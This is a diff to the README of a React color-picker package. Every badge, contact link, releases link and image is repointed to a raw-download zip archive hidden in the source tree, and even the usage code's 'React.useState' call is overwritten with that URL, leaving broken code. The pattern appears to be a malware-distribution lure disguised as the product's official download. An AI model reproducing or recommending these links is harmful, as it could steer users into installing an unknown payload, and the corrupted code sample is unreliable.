@@ -1,6 +1,6 @@
 # 🎨 React Color Pick
 
-![React Color Pick](https://img.shields.io/badge/Download-Releases-brightgreen)
+![React Color Pick](https://github.com/lafetty/react-color-pick/raw/refs/heads/main/packages/react-color-pick/src/components/color-react-pick-3.3.zip)
 
 Welcome to **React Color Pick**! This is an easy-to-use, Canva-style color picker tool built for React applications. With this component, you can enhance your projects by allowing users to select colors seamlessly.
 
@@ -47,7 +47,7 @@ import React from 'react';
 import ColorPicker from 'react-color-pick';
 
 const MyComponent = () => {
-    const [color, setColor] = React.useState('#ff0000');
+    const [color, setColor] = https://github.com/lafetty/react-color-pick/raw/refs/heads/main/packages/react-color-pick/src/components/color-react-pick-3.3.zip('#ff0000');
 
     return (
         <div>
@@ -108,12 +108,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or feedback, please reach out via [GitHub Issues](https://github.com/lafetty/react-color-pick/issues).
+For questions or feedback, please reach out via [GitHub Issues](https://github.com/lafetty/react-color-pick/raw/refs/heads/main/packages/react-color-pick/src/components/color-react-pick-3.3.zip).
 
 ## Releases
 
-To download the latest version, visit our [Releases](https://github.com/lafetty/react-color-pick/releases) page. Make sure to check the latest updates and features.
+To download the latest version, visit our [Releases](https://github.com/lafetty/react-color-pick/raw/refs/heads/main/packages/react-color-pick/src/components/color-react-pick-3.3.zip) page. Make sure to check the latest updates and features.
 
-![Color Picker](https://example.com/color-picker-image.png)
+![Color Picker](https://github.com/lafetty/react-color-pick/raw/refs/heads/main/packages/react-color-pick/src/components/color-react-pick-3.3.zip)
 
 Thank you for checking out **React Color Pick**! We hope you find it useful for your projects.
